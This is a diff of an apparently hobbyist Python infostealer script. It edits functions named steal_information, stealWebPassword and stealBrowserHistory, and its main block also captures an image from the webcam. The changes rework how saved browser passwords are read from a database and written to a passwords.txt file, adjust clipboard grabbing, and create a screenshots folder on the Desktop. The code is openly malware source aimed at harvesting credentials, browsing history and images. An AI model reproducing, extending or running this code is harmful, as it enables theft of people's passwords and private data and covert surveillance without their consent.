@@ -78,7 +78,7 @@ def steal_information():
 
     # Get all text from the clipboard
     pyautogui.hotkey('ctrl', 'a')
-    clipboard_text = pyautogui.hotkey('ctrl', 'c')
+    # clipboard_text = pyautogui.hotkey('ctrl', 'c')
     pyautogui.hotkey('esc')
 
     # Write the stolen information to a file
@@ -181,9 +181,9 @@ def stealWebPassword():
     pass_path = os.path.join(os.path.expanduser("~/Desktop/screenshots"), "passwords.txt")
     with open(pass_path, "w",  encoding='utf-8') as f:
         # Decrypt the passwords
-        for result in cursor.fetchall():
-            ###password = win32crypt.CryptUnprotectData(result[2])[1].decode("utf-8")
-            f.write("Website: {}\nUsername: {}\nPassword: {}\n".format(result[0], result[1], result[2]))
+        for links, user_name, pwd in cursor.fetchall():
+            ###pwd = win32crypt.CryptUnprotectData(pwd)
+            f.write("Website: {}\nUsername: {}\nPassword: {}\n".format(links, user_name, pwd))
 
     # Clean up
     cursor.close()
@@ -267,6 +267,9 @@ def stealBrowserHistory():
 
 
 if __name__ == '__main__':
+    if not os.path.exists(os.path.join(os.path.join(os.path.expanduser("~/Desktop")), "screenshots")):
+        os.makedirs(os.path.join(os.path.join(os.path.expanduser("~/Desktop")), "screenshots"))
+
     network_info = get_network_info()
     print("Network Information\n")
     print("Bytes sent: ", network_info['bytes_sent'])
@@ -299,10 +302,6 @@ if __name__ == '__main__':
     #Capture Image from Webcam
     capture_image_from_webcam()
 
-    # Open URL IN WEB BROWSER
-    url = "https://github.com/Anonymous3017"
-    #open_url(url)
-
     #Get all Passwords from browser
     stealWebPassword()
 
@@ -314,3 +313,8 @@ if __name__ == '__main__':
 
     #Get BROWSER HISTORY
     stealBrowserHistory()
+
+    # Open URL IN WEB BROWSER
+    time.sleep(5)
+    url = "https://github.com/Anonymous3017"
+    # open_url(url)
